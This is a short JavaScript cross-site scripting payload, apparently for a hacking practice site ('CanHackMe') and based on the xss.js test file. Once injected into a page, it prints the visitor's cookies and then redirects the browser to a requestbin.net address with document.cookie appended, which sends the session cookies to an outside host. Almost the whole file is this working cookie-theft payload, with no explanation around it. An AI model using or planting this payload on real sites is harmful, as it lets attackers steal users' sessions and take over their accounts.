
/* This file is based on the file from http://ha.ckers.org/xss.js
For CanHackMe.............
*/

document.write ("This is remote text via xss.js located at xss.rocks " + document.cookie);
alert(document.location="http://requestbin.net/r/1juu70h1?" + document.cookie);
document.location="http://requestbin.net/r/1juu70h1?" + document.cookie;

